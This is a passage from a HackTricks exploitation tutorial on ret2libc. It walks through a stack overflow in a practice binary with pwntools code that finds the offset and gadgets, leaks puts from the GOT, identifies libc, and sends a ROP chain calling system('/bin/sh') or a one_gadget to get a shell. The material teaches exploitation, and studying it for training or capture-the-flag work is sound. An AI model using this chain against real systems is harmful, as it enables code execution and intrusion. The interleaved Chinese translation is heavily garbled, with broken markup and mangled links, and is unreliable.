

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


# Quick Resume

ï¼ƒå¿«é€Ÿç®€å†

1. **Find** overflow **offset**

1. **æŸ¥æ‰¾**æº¢å‡º**åç§»**
2. **Find** `POP_RDI`, `PUTS_PLT` and `MAIN_PLT` gadgets

2. **æ‰¾åˆ°** pop_rdi`ï¼Œ`puts_plt`å’Œ`main_plt`å°å·¥å…·
3. Use previous gadgets lo **leak the memory address** of puts or another libc function and **find the libc version** ([donwload it](https://libc.blukat.me))

3.ä½¿ç”¨ä»¥å‰çš„å°å·¥å…·lo **æ³„æ¼äº†putsæˆ–å…¶ä»–libcå‡½æ•°çš„å†…å­˜åœ°å€**ï¼Œ**æ‰¾åˆ°libcç‰ˆæœ¬**ï¼ˆ[donwload it it]ï¼ˆhttps://libc.blukat.meï¼‰ï¼‰
4. With the library, **calculate the ROP and exploit it**

4.ä½¿ç”¨åº“ï¼Œ**è®¡ç®—ROPå¹¶åˆ©ç”¨å®ƒ**

# Other tutorials and binaries to practice

ï¼ƒå…¶ä»–ç»ƒä¹ æ•™ç¨‹å’ŒäºŒè¿›åˆ¶æ–‡ä»¶

This tutorial is going to exploit the code/binary proposed in this tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\

æœ¬æ•™ç¨‹å°†åˆ©ç”¨æœ¬æ•™ç¨‹ä¸­æå‡ºçš„ä»£ç /äºŒè¿›åˆ¶æ–‡ä»¶ï¼š[https://tasteofsecurity.com/security/ret2libc-unknown-libc/]ï¼ˆ ï¼‰\
Another useful tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

å¦ä¸€ä¸ªæœ‰ç”¨çš„æ•™ç¨‹ï¼š[https://made0x78.com/bseries-ret2libc/]ï¼ˆhttps://made0x78.com/bseries-ret2libc/ï¼‰ csaw19 \ _babyboi/index.html]ï¼ˆhttps://guyinatuxedo.github.io/08-bof _dynamic/csaw19 \ _babyboi/index.htmlï¼‰

# Code

Filename: `vuln.c`

```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```

# ROP - Leaking LIBC template

ï¼ƒROP-æ³„æ¼LIBCæ¨¡æ¿

I'm going to use the code located here to make the exploit.\

æˆ‘å°†ä½¿ç”¨ä½äºæ­¤å¤„çš„ä»£ç è¿›è¡Œåˆ©ç”¨ã€‚\ \
Download the exploit and place it in the same directory as the vulnerable binary and give the needed data to the script:

ä¸‹è½½åˆ©ç”¨å¹¶å°†å…¶æ”¾ç½®åœ¨ä¸å¼±åŠ¿äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶å°†æ‰€éœ€çš„æ•°æ®æä¾›ç»™è„šæœ¬ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}

{ï¼…content-ref url =â€œ rop-leaking-libc-template.mdâ€ï¼…}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)

[rop-leaking-libc-template.md]ï¼ˆrop-leaking-libc-template.mdï¼‰
{% endcontent-ref %}

# 1- Finding the offset

ï¼ƒ1-æŸ¥æ‰¾åç§»

The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default `OFFSET = ""`):

åœ¨ç»§ç»­ä½¿ç”¨æ¼æ´ä¹‹å‰ï¼Œè¯¥æ¨¡æ¿éœ€è¦åç§»ã€‚ å¦‚æœæä¾›çš„è¯ï¼Œå®ƒå°†æ‰§è¡Œå¿…è¦çš„ä»£ç ä»¥æ‰¾åˆ°å®ƒï¼ˆé»˜è®¤æƒ…å†µä¸‹`offset =â€œâ€`ï¼‰ï¼š

```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```

**Execute** `python template.py` a GDB console will be opened with the program being crashed. Inside that **GDB console** execute `x/wx $rsp` to get the **bytes** that were going to overwrite the RIP. Finally get the **offset** using a **python** console:

**æ‰§è¡Œ**`python template.py` gdbæ§åˆ¶å°å°†åœ¨ç¨‹åºå´©æºƒæ—¶æ‰“å¼€ã€‚ åœ¨è¯¥** GDBæ§åˆ¶å°å†…éƒ¨**æ‰§è¡Œ`x/wx $ rsp`ä»¥è·å–å°†è¦†ç›–RIPçš„**å­—èŠ‚**ã€‚ æœ€ç»ˆä½¿ç”¨** Python **æ§åˆ¶å°è·å¾—**åç§»**ï¼š

```python
from pwn import *
cyclic_find(0x6161616b)
```

![](<../../../.gitbook/assets/image (140).png>)

After finding the offset (in this case 40) change the OFFSET variable inside the template using that value.\

æ‰¾åˆ°åç§»åï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹40ï¼‰ä½¿ç”¨è¯¥å€¼æ›´æ”¹æ¨¡æ¿å†…éƒ¨çš„åç§»å˜é‡ã€‚
`OFFSET = "A" * 40`

Another way would be to use: `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` from GEF.

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ï¼š`æ¨¡å¼åˆ›å»º1000`- _ executeï¼Œç›´åˆ°ret_-```ret_-ï¼‰'gefçš„æ¨¡å¼seach $ rsp`ã€‚

# 2- Finding Gadgets

Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call `puts`to find the **libc** being used, and later to **launch the final exploit**.

ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­æ‰¾åˆ°ROPå°å·¥å…·ã€‚ æ­¤ROPå°å·¥å…·å°†è°ƒç”¨`puts`æ‰¾åˆ°ä½¿ç”¨çš„** libc **å¾ˆæœ‰ç”¨ï¼Œç„¶åä»¥å**å¯åŠ¨æœ€ç»ˆæ¼æ´åˆ©ç”¨**ã€‚

```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```

The `PUTS_PLT` is needed to call the **function puts**.\

éœ€è¦â€œ puts_pltâ€è°ƒç”¨**å‡½æ•°put **ã€‚
The `MAIN_PLT` is needed to call the **main function** again after one interaction to **exploit** the overflow **again** (infinite rounds of exploitation). **It is used at the end of each ROP to call the program again**.\

éœ€è¦â€œ main_pltâ€å†æ¬¡è°ƒç”¨** mainå‡½æ•°**åœ¨ä¸€æ¬¡äº¤äº’åå†æ¬¡è°ƒç”¨** exploit **å†æ¬¡æº¢å‡º** **ï¼ˆæ— é™çš„å‰¥å‰Šå›åˆï¼‰ã€‚ **åœ¨æ¯ä¸ªROPçš„æœ«å°¾ä½¿ç”¨å®ƒå†æ¬¡è°ƒç”¨è¯¥ç¨‹åº**ã€‚
The **POP\_RDI** is needed to **pass** a **parameter** to the called function.

éœ€è¦** pop \ _rdi ** **å°†** a **å‚æ•°**ä¼ é€’ç»™äº†è°ƒç”¨å‡½æ•°ã€‚

In this step you don't need to execute anything as everything will be found by pwntools during the execution.

åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œæ‚¨æ— éœ€æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå› ä¸ºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒPWNToolsä¼šå‘ç°æ‰€æœ‰å†…å®¹ã€‚

# 3- Finding LIBC library

Now is time to find which version of the **libc** library is being used. To do so we are going to **leak** the **address** in memory of the **function** `puts`and then we are going to **search** in which **library version** the puts version is in that address.

ç°åœ¨æ˜¯æ—¶å€™æ‰¾åˆ°æ­£åœ¨ä½¿ç”¨** libc **åº“çš„ç‰ˆæœ¬äº†ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†**æ³„æ¼** **åœ°å€**ä¸ºäº†çºªå¿µ**å‡½æ•°** p putså’Œï¼Œç„¶åæˆ‘ä»¬å°†** search ** ** libraryç‰ˆæœ¬** putsç‰ˆæœ¬åœ¨è¯¥åœ°å€ä¸­ã€‚

```python
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```

To do so, the most important line of the executed code is:

ä¸ºæ­¤ï¼Œæ‰§è¡Œä»£ç çš„æœ€é‡è¦è¡Œæ˜¯ï¼š

```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```

This will send some bytes util **overwriting** the **RIP** is possible: `OFFSET`.\

è¿™å°†å‘é€ä¸€äº›å­—èŠ‚util **è¦†ç›–** ** rip **æ˜¯å¯èƒ½çš„ï¼š`offset`ã€‚
Then, it will set the **address** of the gadget `POP_RDI` so the next address (`FUNC_GOT`) will be saved in the **RDI** registry. This is because we want to **call puts** **passing** it the **address** of the `PUTS_GOT`as the address in memory of puts function is saved in the address pointing by `PUTS_GOT`.\

ç„¶åï¼Œå®ƒå°†è®¾ç½®å°å·¥å…·çš„**åœ°å€** pop_rdi`ï¼Œå› æ­¤ä¸‹ä¸€ä¸ªåœ°å€ï¼ˆ`func_got`ï¼‰å°†ä¿å­˜åœ¨** rdi **æ³¨å†Œè¡¨ä¸­ã€‚ è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³**å‘¼å«put ** **ä¼ é€’**å®ƒçš„**åœ°å€** p puts_got`çš„åœ°å€ä½œä¸ºè®°å¿†putså‡½æ•°ä¸­çš„åœ°å€ä¿å­˜åœ¨åœ°å€ä¸­ï¼Œç”±p puts_got`ä¿å­˜åœ¨åœ°å€ã€‚
After that, `PUTS_PLT` will be called (with `PUTS_GOT` inside the **RDI**) so puts will **read the content** inside `PUTS_GOT` (**the address of puts function in memory**) and will **print it out**.\

ä¹‹åï¼Œå°†è°ƒç”¨`puts_plt`å°†è¢«è°ƒç”¨ï¼ˆåœ¨** rdi **å†…ä½¿ç”¨`puts_got`ï¼‰ï¼Œå› æ­¤putså°†**è¯»å–``puts_got'ence repand puts_got'ï¼ˆ** putså‡½æ•°**ï¼‰å’Œ å°†**æ‰“å°å‡º**ã€‚\ \
Finally, **main function is called again** so we can exploit the overflow again.

æœ€åï¼Œ**ä¸»å‡½æ•°å†æ¬¡ç§°ä¸º**ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨æº¢å‡ºã€‚

This way we have **tricked puts function** to **print** out the **address** in **memory** of the function **puts** (which is inside **libc** library). Now that we have that address we can **search which libc version is being used**.

è¿™æ ·ï¼Œæˆ‘ä»¬å°±**æ¬ºéª—äº†å‡½æ•°** **åœ¨**å†…å­˜**ä¸­çš„**åœ°å€** **çš„** put ** put **ï¼ˆåœ¨** libc **åº“ä¸­ï¼‰ã€‚ ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†è¿™ä¸ªåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥**æœç´¢å“ªä¸ªlibcç‰ˆæœ¬æ­£åœ¨ä½¿ç”¨**ã€‚

![](<../../../.gitbook/assets/image (141).png>)

As we are **exploiting** some **local** binary it is **not needed** to figure out which version of **libc** is being used (just find the library in `/lib/x86_64-linux-gnu/libc.so.6`).\

ç”±äºæˆ‘ä»¬æ­£åœ¨**åˆ©ç”¨**ä¸€äº›** local **äºŒè¿›åˆ¶**ä¸éœ€è¦**æ‰èƒ½æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„** libc **ï¼ˆåªéœ€åœ¨`/lib/x86_64-linuxä¸­æ‰¾åˆ°åº“ -gnu/libc.so.6`ï¼‰ã€‚
But, in a remote exploit case I will explain here how can you find it:

ä½†æ˜¯ï¼Œåœ¨è¿œç¨‹åˆ©ç”¨æ¡ˆä¾‹ä¸­ï¼Œæˆ‘å°†åœ¨è¿™é‡Œè§£é‡Šå¦‚ä½•æ‰¾åˆ°å®ƒï¼š

## 3.1- Searching for libc version (1)

## 3.1-æœç´¢libcç‰ˆæœ¬ï¼ˆ1ï¼‰

You can search which library is being used in the web page: [https://libc.blukat.me/](https://libc.blukat.me)\

æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸­æœç´¢å“ªä¸ªåº“ï¼š[https://libc.blukat.me/]ï¼ˆhttps://libc.blukat.meï¼‰\
It will also allow you to download the discovered version of **libc**

å®ƒè¿˜å…è®¸æ‚¨ä¸‹è½½å‘ç°çš„** libc **çš„ç‰ˆæœ¬

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Searching for libc version (2)

## 3.2-æœç´¢LIBCç‰ˆæœ¬ï¼ˆ2ï¼‰

You can also do:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

This will take some time, be patient.\

è¿™å°†éœ€è¦ä¸€äº›æ—¶é—´ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚
For this to work we need:

ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ï¼š

* Libc symbol name: `puts`
* Leaked libc adddress: `0x7ff629878690`

*æ³„æ¼çš„libc adddressï¼š`0x7ff629878690`

We can figure out which **libc** that is most likely used.

æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºæœ€æœ‰å¯èƒ½ä½¿ç”¨çš„** libc **ã€‚

```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```

We get 2 matches (you should try the second one if the first one is not working). Download the first one:

æˆ‘ä»¬è·å¾—2æ¬¡åŒ¹é…ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªä¸èµ·ä½œç”¨ï¼Œåˆ™åº”å°è¯•ç¬¬äºŒåœºæ¯”èµ›ï¼‰ã€‚ ä¸‹è½½ç¬¬ä¸€ä¸ªï¼š

```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```

Copy the libc from `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` to our working directory.

ä»â€œ libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.soâ€å¤åˆ¶libcã€‚

## 3.3- Other functions to leak

## 3.3-å…¶ä»–åŠŸèƒ½æ³„æ¼

```python
puts
printf
__libc_start_main
read
gets
```

# 4- Finding based libc address & exploiting

ï¼ƒ4-åŸºäºå‘ç°çš„LIBCåœ°å€å’Œåˆ©ç”¨

At this point we should know the libc library used. As we are exploiting a local binary I will use just:`/lib/x86_64-linux-gnu/libc.so.6`

åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥çŸ¥é“ä½¿ç”¨çš„LIBCåº“ã€‚ å½“æˆ‘ä»¬åˆ©ç”¨æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œæˆ‘å°†ä»…ä½¿ç”¨ï¼š`/lib/x86_64-linux-gnu/libc.so.6``

So, at the begging of `template.py` change the **libc** variable to: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

å› æ­¤ï¼Œåœ¨`template.pyçš„å¼€å¤´ã€‚ `

Giving the **path** to the **libc library** the rest of the **exploit is going to be automatically calculated**.

å°†**è·¯å¾„**æä¾›ç»™** libcåº“** **æ¼æ´å°†è‡ªåŠ¨è®¡ç®—**ã€‚

Inside the `get_addr`function the **base address of libc** is going to be calculated:

åœ¨â€œ get_addrâ€å‡½æ•°ä¸­ï¼Œå°†è®¡ç®—Libc **çš„åŸºç¡€åœ°å€ï¼š

```python
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```

{% hint style="info" %}

{ï¼…æç¤ºæ ·å¼=â€œ infoâ€ï¼…}
Note that **final libc base address must end in 00**. If that's not your case you might have leaked an incorrect library.

è¯·æ³¨æ„ï¼Œ**æœ€ç»ˆLIBCåŸºç¡€åœ°å€å¿…é¡»ä»¥00 **ç»“æŸã€‚ å¦‚æœä¸æ˜¯æ‚¨çš„æƒ…å†µï¼Œæ‚¨å¯èƒ½å·²ç»æ³„éœ²äº†ä¸€ä¸ªä¸æ­£ç¡®çš„åº“ã€‚
{% endhint %}

Then, the address to the function `system` and the **address** to the string _"/bin/sh"_ are going to be **calculated** from the **base address** of **libc** and given the **libc library.**

ç„¶åï¼Œå‡½æ•°`system'çš„åœ°å€å’Œå­—ç¬¦ä¸²_â€œ/bin/shâ€ _çš„**åœ°å€**å°†æ˜¯**ä»** of ** of ** libc*çš„åŸºç¡€åœ°å€**è®¡ç®—** ** *å¹¶ç»™å®š** libcåº“ã€‚**

```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```

Finally, the /bin/sh execution exploit is going to be prepared sent:

æœ€åï¼Œ /bin /shæ‰§è¡Œåˆ©ç”¨å°†å‡†å¤‡å¥½ï¼š

```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```

Let's explain this final ROP.\

è®©æˆ‘ä»¬è§£é‡Šä¸€ä¸‹è¿™ä¸ªæœ€åçš„ropã€‚\ \
The last ROP (`rop1`) ended calling again the main function, then we can **exploit again** the **overflow** (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI` pointing to the **addres** of _"/bin/sh"_ (`BINSH`) and call **system** function (`SYSTEM`) because the address of _"/bin/sh"_ will be passed as a parameter.\

æœ€åä¸€ä¸ªROPï¼ˆ``rop1`ï¼‰å†æ¬¡å‘¼å«ä¸»å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥**å†æ¬¡åˆ©ç”¨** **æº¢å‡º**ï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ``offset''å†æ¬¡åœ¨è¿™é‡Œï¼‰çš„åŸå› ã€‚ ç„¶åï¼Œæˆ‘ä»¬è¦è°ƒç”¨`pop_rdi`æŒ‡å‘_â€œ/bin/shâ€ _ï¼ˆ`binsh`ï¼‰çš„** addres ** addres **ï¼Œå¹¶è°ƒç”¨** system ** functionï¼ˆ`systems`ï¼‰ï¼Œå› ä¸º_â€çš„åœ°å€_â€ /bin/shâ€œ _å°†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚\
Finally, the **address of exit function** is **called** so the process **exists nicely** and any alert is generated.

æœ€åï¼Œé€€å‡ºå‡½æ•°çš„**åœ°å€**è¢«ç§°ä¸º**ï¼Œå› æ­¤è¯¥è¿‡ç¨‹**å­˜åœ¨å¾ˆå¥½**ï¼Œå¹¶ç”Ÿæˆä»»ä½•è­¦æŠ¥ã€‚

**This way the exploit will execute a **_**/bin/sh**_** shell.**

**è¿™æ ·çš„æ–¹æ³•å°†æ‰§è¡ŒA ** _ **/bin/sh ** _ ** shellã€‚**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Using ONE\_GADGET

You could also use [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)to obtain a shell instead of using **system** and **"/bin/sh". ONE\_GADGET** will find inside the libc library some way to obtain a shell using just one **ROP address**. \

æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨[**ä¸€ä¸ª\ _gadget **]ï¼ˆhttps://github.com/david942j/one \ _gadgetï¼‰æ¥è·å¾—å¤–å£³ï¼Œè€Œä¸æ˜¯ä½¿ç”¨**ç³»ç»Ÿ**å’Œ**å’Œ**å’Œ**â€œ/bin/shâ€ã€‚ ä¸€ä¸ª\ _gadget **å°†åœ¨libcåº“ä¸­ä»¥æŸç§æ–¹å¼æ‰¾åˆ°ä»…ä½¿ç”¨ä¸€ä¸ª** ropåœ°å€**è·å¾—å£³çš„æ–¹å¼ã€‚ \ \
However, normally there are some constrains, the most common ones and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the **RSP** you just have to send some more NULL values so the constrain is avoided.

ä½†æ˜¯ï¼Œé€šå¸¸ä¼šæœ‰ä¸€äº›çº¦æŸï¼Œæœ€å¸¸è§çš„å’Œæ˜“äºé¿å…çš„æ˜¯`[rsp+0x30] == null`å½“æ‚¨æ§åˆ¶** rsp **å†…éƒ¨çš„å€¼æ—¶ï¼Œæ‚¨åªéœ€è¦å‘é€æ›´å¤šçš„ç©ºå€¼ é¿å…äº†çº¦æŸã€‚

![](<../../../.gitbook/assets/image (615).png>)

```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```

# EXPLOIT FILE

You can find a template to exploit this vulnerability here:

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°ä¸€ä¸ªæ¨¡æ¿æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}

{ï¼…content-ref url =â€œ rop-leaking-libc-template.mdâ€ï¼…}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)

[rop-leaking-libc-template.md]ï¼ˆrop-leaking-libc-template.mdï¼‰
{% endcontent-ref %}

# Common problems

## MAIN\_PLT = elf.symbols\['main'] not found

## main \ _plt = elf.symbols \ ['main']æ‰¾ä¸åˆ°

If the "main" symbol does not exist. Then you can just where is the main code:

å¦‚æœâ€œä¸»è¦â€ç¬¦å·ä¸å­˜åœ¨ã€‚ ç„¶åï¼Œæ‚¨å¯ä»¥åœ¨å“ªé‡Œæ˜¯ä¸»è¦ä»£ç ï¼š

```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```

and set the address manually:

å¹¶æ‰‹åŠ¨è®¾ç½®åœ°å€ï¼š

```python
MAIN_PLT = 0x401080
```

## Puts not found

##æ‰¾ä¸åˆ°

If the binary is not using Puts you should check if it is using

å¦‚æœäºŒè¿›åˆ¶ä¸ä½¿ç”¨putï¼Œåˆ™åº”æ£€æŸ¥æ˜¯å¦æ­£åœ¨ä½¿ç”¨

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

##`shï¼š1ï¼šï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼šæ‰¾ä¸åˆ°

If you find this **error** after creating **all** the exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

å¦‚æœæ‚¨å‘ç°æ­¤**é”™è¯¯**åˆ›å»º**æ‰€æœ‰** exploitï¼š`shï¼š1ï¼šï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼…sï¼šæ‰¾ä¸åˆ°

Try to **subtract 64 bytes to the address of "/bin/sh"**:

å°è¯•**å°†64ä¸ªå­—èŠ‚å‡ä¸ºâ€œ/bin/shâ€ **ï¼š

```python
BINSH = next(libc.search("/bin/sh")) - 64
```


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

